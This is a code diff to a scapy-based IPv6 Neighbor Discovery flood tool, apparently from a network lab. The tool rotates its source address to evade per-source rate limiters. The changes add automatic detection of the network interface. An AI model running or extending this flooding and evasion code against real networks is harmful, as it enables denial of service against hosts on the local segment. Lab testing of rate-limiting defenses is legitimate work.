@@ -6,6 +6,7 @@ Generates Neighbor Discovery flood traffic while continuously rotating its
 source IPv6 address every few seconds to evade naive per-source-IP rate limiters.
 """
 
+import os
 import sys
 import time
 import random
@@ -14,18 +15,31 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import send, IPv6, ICMPv6ND_NS, ICMPv6ND_NA
 
+def get_default_iface() -> str:
+    """Auto-detects the first non-loopback network interface in the current namespace."""
+    try:
+        ifaces = [i for i in os.listdir('/sys/class/net/') if i != 'lo']
+        if ifaces:
+            eths = [i for i in ifaces if 'eth' in i]
+            return eths[0] if eths else ifaces[0]
+    except Exception:
+        pass
+    return "eth0"
+
 def random_ipv6_addr(prefix: str = "fd00:abcd::") -> str:
     rand_suffix = f"{random.randint(1, 0xffff):04x}:{random.randint(1, 0xffff):04x}"
     return f"{prefix}{rand_suffix}"
 
 def launch_ndp_flood(
-    iface: str = [i for i in __import__('os').listdir('/sys/class/net/') if i != 'lo'][0],
+    iface: str = None,
     ndp_type: str = "NS",
     total_packets: int = 50,
     rate_pps: float = 10.0,
     rotate_seconds: float = 2.0,
     target_scan: bool = False
 ):
+    if iface is None:
+        iface = get_default_iface()
     print(f"[*] Starting {ndp_type} Flood Attack on {iface}...")
     print(f"[*] Total packets: {total_packets}, Rate: {rate_pps} pps, IP rotation: every {rotate_seconds}s")
 
@@ -66,8 +80,9 @@ def launch_ndp_flood(
     print(f"[+] NDP {ndp_type} flood complete. Total sent: {total_packets}, Rotations: {rotations_done}")
 
 if __name__ == "__main__":
+    default_iface = get_default_iface()
     parser = argparse.ArgumentParser(description="PS-007 Rotating-Source NDP Flood Tool")
-    parser.add_argument("-i", "--iface", default="h3-eth0", help="Network interface")
+    parser.add_argument("-i", "--iface", default=default_iface, help=f"Network interface (default: {default_iface})")
     parser.add_argument("-t", "--type", choices=["NS", "NA"], default="NS", help="NDP message type to flood")
     parser.add_argument("-n", "--count", type=int, default=40, help="Total packets to send")
     parser.add_argument("-r", "--rate", type=float, default=8.0, help="Transmission rate (packets/sec)")
